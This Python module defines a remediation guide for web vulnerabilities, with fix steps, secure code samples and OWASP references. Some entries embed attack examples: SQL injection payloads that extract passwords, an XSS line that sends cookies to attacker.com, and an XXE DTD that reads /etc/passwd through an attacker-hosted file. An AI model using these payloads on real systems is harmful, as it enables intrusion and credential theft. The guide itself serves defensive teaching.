"""
Remediation Guide
Provides detailed remediation instructions for common vulnerabilities
"""

from typing import Dict, List


class RemediationGuide:
    """Enhanced remediation guidance for vulnerabilities."""
    
    REMEDIATION_DATABASE = {
        'SQL Injection': {
            'priority': 'CRITICAL',
            'fix_time': '1-2 days',
            'steps': [
                'Use parameterized queries (prepared statements) for all database interactions',
                'Implement input validation and sanitization',
                'Apply principle of least privilege for database accounts',
                'Use ORM frameworks that handle parameterization automatically',
                'Enable SQL error logging but hide errors from users',
                'Conduct code review of all database queries'
            ],
            'exploit_example': '''
ATTACK SCENARIO - SQL Injection:
1. Test the parameter with: ' OR 1=1--
2. Error-based: ' AND 1=CONVERT(int, (SELECT @@version))--
3. Time-based blind: ' OR IF(1=1, SLEEP(5), 0)--
4. Union-based: ' UNION SELECT null, username, password FROM users--

ATTACK PAYLOAD:
# Authentication Bypass:
username: admin' OR '1'='1
password: anything

# Data Extraction:
id=1' UNION SELECT null, username, password, email FROM users--

# Boolean Blind:
id=1' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a
''',
            'code_example': '''
# Bad (Vulnerable):
query = f"SELECT * FROM users WHERE id = {user_id}"
cursor.execute(query)

# Bad (String concatenation):
query = "SELECT * FROM users WHERE username = '" + username + "'"

# Good (Secure - Parameterized):
cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))

# Good (ORM):
User.objects.get(id=user_id)

# Good (Prepared statements - Python):
cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", (username, password))
''',
            'solution': '''
SOLUTION:
1. Use parameterized queries ALWAYS: cursor.execute("SELECT * FROM users WHERE id = ?", (id,))
2. Use ORM frameworks (SQLAlchemy, Django ORM) that handle parameterization
3. Validate input: allow only expected characters (whitelist)
4. Apply least privilege: database user should only have needed permissions
5. Hide database errors from users: log them but show generic error messages
6. Use Web Application Firewall (WAF) as additional layer
''',
            'references': [
                'OWASP SQL Injection Prevention Cheat Sheet',
                'CWE-89: Improper Neutralization of Special Elements',
                'https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html'
            ]
        },
        
        'Cross-Site Scripting (XSS)': {
            'priority': 'HIGH',
            'fix_time': '1-3 days',
            'steps': [
                'Implement output encoding for all user-supplied data',
                'Use Content Security Policy (CSP) headers',
                'Validate and sanitize all input data',
                'Use HTTPOnly and Secure flags for cookies',
                'Implement context-aware output encoding (HTML, JavaScript, URL)',
                'Use modern frameworks with built-in XSS protection'
            ],
            'exploit_example': '''
ATTACK SCENARIO - Reflected XSS:
1. On the Submit feedback page, change the query parameter returnPath to / followed by a random alphanumeric string
2. Right-click and inspect the element, observe that your string has been placed inside an a href attribute
3. Change returnPath to: javascript:alert(document.cookie)
4. Hit enter and click "back"
5. The payload executes and shows the cookies

ATTACK PAYLOAD:
?returnPath=javascript:alert(document.cookie)

Or for Stored XSS:
<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>
''',
            'code_example': '''
# Bad (Vulnerable):
<div>{{ user_input }}</div>
<a href="{{ returnPath }}">Back</a>

# Good (Secure):
<div>{{ user_input | escape }}</div>
<a href="{{ returnPath | escape | validate_url }}">Back</a>

# CSP Header:
Content-Security-Policy: default-src 'self'; script-src 'self'

# Python/Flask Example:
from markupsafe import escape
return f'<div>{escape(user_input)}</div>'
''',
            'solution': '''
SOLUTION:
1. Encode all user input before displaying it in HTML
2. Add Content-Security-Policy header: Content-Security-Policy: default-src 'self'
3. Validate URLs against whitelist before using in href attributes
4. Set HTTPOnly and Secure flags on all cookies
5. Use framework's auto-escaping features (Jinja2, React, Angular)
''',
            'references': [
                'OWASP XSS Prevention Cheat Sheet',
                'CWE-79: Improper Neutralization of Input',
                'https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html'
            ]
        },
        
        'Command Injection': {
            'priority': 'CRITICAL',
            'fix_time': '1 day',
            'steps': [
                'Avoid calling system commands with user input',
                'Use language-specific libraries instead of shell commands',
                'Implement strict input validation with whitelisting',
                'Use parameterized/prepared commands if shell execution is necessary',
                'Run application with minimal privileges',
                'Implement command execution logging and monitoring'
            ],
            'code_example': '''
# Bad (Vulnerable):
os.system(f"ping {user_ip}")

# Good (Secure):
import subprocess
subprocess.run(["ping", "-c", "4", user_ip], timeout=5)
''',
            'references': [
                'OWASP Command Injection',
                'CWE-78: OS Command Injection',
                'https://owasp.org/www-community/attacks/Command_Injection'
            ]
        },
        
        'CSRF (Cross-Site Request Forgery)': {
            'priority': 'MEDIUM',
            'fix_time': '1-2 days',
            'steps': [
                'Implement CSRF tokens for all state-changing operations',
                'Use SameSite cookie attribute',
                'Verify Origin and Referer headers',
                'Implement double-submit cookie pattern',
                'Require re-authentication for sensitive actions',
                'Use frameworks with built-in CSRF protection'
            ],
            'code_example': '''
# Generate CSRF token:
<input type="hidden" name="csrf_token" value="{{ csrf_token }}">

# Validate on server:
if request.form['csrf_token'] != session['csrf_token']:
    abort(403)

# Cookie settings:
Set-Cookie: session=...; SameSite=Strict; Secure; HttpOnly
''',
            'references': [
                'OWASP CSRF Prevention Cheat Sheet',
                'CWE-352: Cross-Site Request Forgery',
                'https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html'
            ]
        },
        
        'SSRF (Server-Side Request Forgery)': {
            'priority': 'HIGH',
            'fix_time': '2-3 days',
            'steps': [
                'Implement URL whitelist for allowed destinations',
                'Disable or restrict URL redirects',
                'Validate and sanitize all URLs',
                'Use network segmentation to isolate internal services',
                'Block access to private IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)',
                'Implement request signing for internal API calls'
            ],
            'code_example': '''
# Validate URL before making request:
from urllib.parse import urlparse

def is_safe_url(url):
    parsed = urlparse(url)
    # Check against whitelist
    allowed_hosts = ['api.example.com', 'data.example.com']
    if parsed.hostname not in allowed_hosts:
        return False
    # Block private IPs
    if parsed.hostname in ['localhost', '127.0.0.1'] or \
       parsed.hostname.startswith('192.168.') or \
       parsed.hostname.startswith('10.'):
        return False
    return True
''',
            'references': [
                'OWASP Server-Side Request Forgery Prevention',
                'CWE-918: Server-Side Request Forgery',
                'https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html'
            ]
        },
        
        'Path Traversal': {
            'priority': 'HIGH',
            'fix_time': '1-2 days',
            'steps': [
                'Use whitelist for allowed file paths',
                'Validate and canonicalize file paths',
                'Use built-in path functions (os.path.join, Path)',
                'Implement chroot jails or sandboxing',
                'Reject paths containing ".." or absolute paths',
                'Use indirect object references (map IDs to files)'
            ],
            'code_example': '''
# Bad (Vulnerable):
file_path = f"/var/data/{user_input}"

# Good (Secure):
from pathlib import Path
base_dir = Path("/var/data")
file_path = (base_dir / user_input).resolve()
if not file_path.is_relative_to(base_dir):
    raise ValueError("Invalid file path")
''',
            'references': [
                'OWASP Path Traversal',
                'CWE-22: Path Traversal',
                'https://owasp.org/www-community/attacks/Path_Traversal'
            ]
        },
        
        'Authentication Bypass': {
            'priority': 'CRITICAL',
            'fix_time': '1-2 days',
            'steps': [
                'Implement proper session management',
                'Use secure password hashing (bcrypt, Argon2)',
                'Enforce multi-factor authentication',
                'Implement account lockout after failed attempts',
                'Use secure session tokens (cryptographically random)',
                'Implement proper logout functionality',
                'Set secure session timeout values'
            ],
            'code_example': '''
# Secure password hashing:
import bcrypt

# Hash password:
hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt())

# Verify password:
if bcrypt.checkpw(password.encode(), stored_hash):
    # Password correct
    pass
''',
            'references': [
                'OWASP Authentication Cheat Sheet',
                'CWE-287: Improper Authentication',
                'https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html'
            ]
        },
        
        'JWT Vulnerabilities': {
            'priority': 'HIGH',
            'fix_time': '1-2 days',
            'steps': [
                'Always verify JWT signatures',
                'Use strong signing algorithms (RS256, not "none")',
                'Implement token expiration (exp claim)',
                'Validate all JWT claims (aud, iss, exp)',
                'Store secrets securely (never in code)',
                'Implement token refresh mechanism',
                'Use HTTPS to prevent token interception'
            ],
            'code_example': '''
# Secure JWT validation:
import jwt

try:
    payload = jwt.decode(
        token,
        secret_key,
        algorithms=["RS256"],  # Specify algorithm
        options={
            "verify_signature": True,
            "verify_exp": True,
            "verify_aud": True
        }
    )
except jwt.InvalidTokenError:
    # Handle invalid token
    pass
''',
            'references': [
                'JWT Security Best Practices',
                'CWE-347: Improper Verification of Cryptographic Signature',
                'https://tools.ietf.org/html/rfc7519'
            ]
        },
        
        'Insecure Deserialization': {
            'priority': 'CRITICAL',
            'fix_time': '2-3 days',
            'steps': [
                'Avoid deserializing untrusted data',
                'Use safe serialization formats (JSON instead of pickle)',
                'Implement integrity checks (HMAC signatures)',
                'Restrict deserialization to allowed classes',
                'Run deserialization in isolated/sandboxed environment',
                'Monitor for suspicious deserialization patterns'
            ],
            'code_example': '''
# Bad (Vulnerable):
import pickle
data = pickle.loads(user_input)

# Good (Secure):
import json
data = json.loads(user_input)
# Or with signature verification:
# signed_data = serializer.loads(user_input)
''',
            'references': [
                'OWASP Deserialization Cheat Sheet',
                'CWE-502: Deserialization of Untrusted Data',
                'https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html'
            ]
        },
        
        'XXE (XML External Entity)': {
            'priority': 'CRITICAL',
            'fix_time': '1-2 days',
            'steps': [
                'Disable XML external entity processing in all XML parsers',
                'Use less complex data formats like JSON when possible',
                'Patch or upgrade all XML processors and libraries',
                'Implement whitelist server-side input validation',
                'Use SAST tools to detect XXE in source code',
                'Implement proper error handling to avoid information disclosure'
            ],
            'exploit_example': '''
ATTACK SCENARIO - XXE File Disclosure:
1. Click "Go to exploit server" and save the following malicious DTD file on your server:

<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;

2. When imported, this page will read the contents of /etc/passwd into the file entity
3. Visit a product page, click "Check stock", and intercept the POST request in Burp Suite
4. Insert the following external entity definition between the XML declaration and stockCheck element:

<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>

5. You should see an error message containing the contents of the /etc/passwd file

ATTACK PAYLOAD:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>
<stockCheck>
  <productId>1</productId>
</stockCheck>
''',
            'code_example': '''
# Bad (Vulnerable):
import xml.etree.ElementTree as ET
tree = ET.parse(user_xml_file)

# Good (Secure - Python):
import xml.etree.ElementTree as ET
import defusedxml.ElementTree as DET
tree = DET.parse(user_xml_file)

# Or disable entities manually:
from lxml import etree
parser = etree.XMLParser(resolve_entities=False, no_network=True)
tree = etree.parse(user_xml_file, parser)

# Java Example:
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
''',
            'solution': '''
SOLUTION:
1. Disable DOCTYPE declarations: setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)
2. Disable external entities: setFeature("http://xml.org/sax/features/external-general-entities", false)
3. Disable parameter entities: setFeature("http://xml.org/sax/features/external-parameter-entities", false)
4. Use defusedxml library in Python instead of standard XML parsers
5. Prefer JSON over XML for data interchange when possible
6. Implement strict input validation and sanitization
''',
            'references': [
                'OWASP XXE Prevention Cheat Sheet',
                'CWE-611: Improper Restriction of XML External Entity Reference',
                'https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html'
            ]
        },
        
        'Information Disclosure': {
            'priority': 'HIGH',
            'fix_time': '1-2 days',
            'steps': [
                'Configure custom error pages for production environments',
                'Disable debug mode and verbose error messages in production',
                'Implement centralized error logging (server-side only)',
                'Remove sensitive data from error responses and stack traces',
                'Configure web server to hide version information',
                'Review source code comments for sensitive information',
                'Implement proper exception handling in all code paths'
            ],
            'exploit_example': '''
ATTACK SCENARIO - Information Disclosure:
1. Navigate to a product page with an invalid productId parameter
2. Example: /product?productId=invalid
3. Observe the error response contains:
   - Stack traces revealing internal file paths
   - Database error messages exposing schema information
   - Framework version numbers (e.g., Django 3.2.5, Apache 2.4.48)
   - Internal IP addresses or server hostnames
   - Sensitive configuration details

COMMON ERROR CODES EXPOSED:
- HTTP 500 Internal Server Error with full stack trace
- Database errors: "MySQL Error 1054: Unknown column 'password' in users table"
- Framework errors: "Traceback (most recent call last): File '/app/views/product.py', line 45..."
- PHP errors: "Fatal error in /var/www/html/config.php on line 127"
- ASP.NET errors: "Server Error in '/' Application. Object reference not set..."

ATTACK PAYLOAD:
# Trigger errors with invalid input:
?productId=999999999
?productId=-1
?productId=<script>alert(1)</script>
?productId=../../etc/passwd
?productId='OR'1'='1
''',
            'code_example': '''
# Bad (Vulnerable - Exposes stack traces):
try:
    product = get_product(product_id)
except Exception as e:
    return f"Error: {str(e)}\n{traceback.format_exc()}", 500

# Bad (Shows database errors):
app.config['DEBUG'] = True  # In production!
app.config['PROPAGATE_EXCEPTIONS'] = True

# Good (Secure - Python/Flask):
import logging

# Configure logging
logging.basicConfig(filename='app.log', level=logging.ERROR)

@app.errorhandler(Exception)
def handle_error(error):
    # Log detailed error server-side
    logging.error(f"Error occurred: {error}", exc_info=True)
    
    # Show generic message to user
    return {"error": "An error occurred processing your request"}, 500

# Good (Production settings):
app.config['DEBUG'] = False
app.config['TESTING'] = False
app.config['PROPAGATE_EXCEPTIONS'] = False

# Good (Custom error pages - Django):
# settings.py
DEBUG = False
ALLOWED_HOSTS = ['yourdomain.com']

# Good (Hide server version - Apache):
# httpd.conf
ServerTokens Prod
ServerSignature Off

# Good (Hide server version - Nginx):
# nginx.conf
server_tokens off;

# Good (Node.js/Express):
app.use((err, req, res, next) => {
    // Log error details
    console.error(err.stack);
    
    // Send generic response
    res.status(500).json({
        error: 'Internal server error'
    });
});
''',
            'solution': '''
SOLUTION - Disable Information Disclosure:

1. DISABLE DEBUG MODE IN PRODUCTION:
   - Python/Flask: app.config['DEBUG'] = False
   - Django: DEBUG = False in settings.py
   - Node.js: NODE_ENV=production
   - PHP: display_errors = Off in php.ini

2. IMPLEMENT CUSTOM ERROR HANDLERS:
   - Catch all exceptions and return generic error messages
   - Log detailed errors server-side only
   - Never expose stack traces, file paths, or internal details to users

3. CONFIGURE WEB SERVER SECURITY:
   - Apache: ServerTokens Prod, ServerSignature Off
   - Nginx: server_tokens off;
   - Hide version information in HTTP headers

4. SECURE ERROR PAGES:
   - Create custom 404, 500 error pages without technical details
   - Use generic messages: "An error occurred" instead of specific errors
   - Never display database errors to end users

5. REVIEW AND REMOVE SENSITIVE DATA:
   - Remove API keys, passwords, tokens from source code
   - Clean up comments containing sensitive information
   - Don't include database schema details in error messages

6. IMPLEMENT PROPER LOGGING:
   - Log all errors server-side with full details
   - Use logging frameworks (Python logging, Winston, Log4j)
   - Store logs securely with restricted access
   - Never log sensitive data (passwords, tokens, PII)

ERROR CODE REFERENCE:
- CWE-209: Generation of Error Message Containing Sensitive Information
- CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
- CWE-497: Exposure of Sensitive System Information
''',
            'references': [
                'OWASP Error Handling Cheat Sheet',
                'CWE-209: Information Exposure Through an Error Message',
                'CWE-200: Exposure of Sensitive Information',
                'https://cheatsheetseries.owasp.org/cheatsheets/Error_Handling_Cheat_Sheet.html',
                'https://cwe.mitre.org/data/definitions/209.html'
            ]
        }
    }
    
    @classmethod
    def get_remediation(cls, vulnerability_type: str) -> Dict:
        """
        Get detailed remediation guidance for a vulnerability type.
        
        Args:
            vulnerability_type: Type of vulnerability
            
        Returns:
            Dictionary with remediation details
        """
        # Try to find exact match first
        for key, value in cls.REMEDIATION_DATABASE.items():
            if key.lower() in vulnerability_type.lower() or \
               vulnerability_type.lower() in key.lower():
                return value
        
        # Return generic guidance if specific not found
        return {
            'priority': 'MEDIUM',
            'fix_time': '1-3 days',
            'steps': [
                'Review the vulnerability description and evidence',
                'Consult OWASP guidelines for this vulnerability type',
                'Implement proper input validation and output encoding',
                'Apply security patches and updates',
                'Conduct thorough testing after remediation'
            ],
            'code_example': 'Refer to security best practices for this vulnerability type',
            'references': [
                'OWASP Top 10',
                'https://owasp.org/www-project-top-ten/'
            ]
        }
    
    @classmethod
    def enhance_vulnerability(cls, vulnerability: Dict) -> Dict:
        """
        Enhance vulnerability dict with detailed remediation.
        
        Args:
            vulnerability: Vulnerability dictionary
            
        Returns:
            Enhanced vulnerability dictionary
        """
        vuln_type = vulnerability.get('type', '')
        remediation_details = cls.get_remediation(vuln_type)
        
        vulnerability['remediation_details'] = remediation_details
        
        # Keep original remediation as summary
        if 'remediation' not in vulnerability or not vulnerability['remediation']:
            vulnerability['remediation'] = remediation_details['steps'][0]
        
        return vulnerability
